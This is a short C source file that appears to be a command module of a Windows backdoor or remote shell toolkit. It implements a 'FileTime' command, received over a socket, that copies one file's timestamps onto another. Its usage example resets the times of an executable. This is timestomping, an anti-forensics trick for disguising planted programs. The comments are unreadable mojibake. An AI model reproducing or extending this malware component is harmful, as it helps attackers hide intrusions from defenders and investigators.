//��¡һ���ļ���ʱ����Ϣ

BOOL ChangeFileTime(char *lpFileName_src, char *lpFileName_dest)
{
	HANDLE hFile_src = 0, hFile_dest = 0;
	FILETIME lpCreationTime; // �ļ��еĴ���ʱ�� 
	FILETIME lpLastAccessTime; // ���ļ��е��������ʱ�� 
	FILETIME lpLastWriteTime; // ���ļ��е�����޸�ʱ�� 

	hFile_src = ZXSAPI::CreateFile(lpFileName_src, 
        GENERIC_READ, 
        FILE_SHARE_READ|FILE_SHARE_DELETE, 
        NULL, 
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile_src == INVALID_HANDLE_VALUE){
		goto error;
	}
	hFile_dest = ZXSAPI::CreateFile(lpFileName_dest, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_DELETE, 
        NULL, 
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile_dest == INVALID_HANDLE_VALUE){
		goto error;
	}
	if(! GetFileTime(hFile_src, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		goto error;
	if(! SetFileTime(hFile_dest, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		goto error;

	CloseHandle(hFile_src);
	CloseHandle(hFile_dest);
	return 1;
error:
	if(hFile_src != INVALID_HANDLE_VALUE)
		CloseHandle(hFile_src);
	if(hFile_dest != INVALID_HANDLE_VALUE)
		CloseHandle(hFile_dest);
	return 0;
}

int FileTime(MainPara *args)
{
	SPAMFUNCTION
		
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"Usage:\r\n"
		"     FileTime SourceFileName DestFileName\r\n"
		"example:\r\n"
		"     FileTime C:\\a.exe C:\\b.exe (b.exe will be reset filetime.)\r\n";
	if(argc < 3)
		return SendMessage(Socket, Usage);

	if(ChangeFileTime(argv[1], argv[2]))
		SendMessage(Socket, "Set %s File Time To %s Successfully.\r\n", argv[1], argv[2]);
	else
		err_display(Socket, "FileTime", 1);

	return 1;
}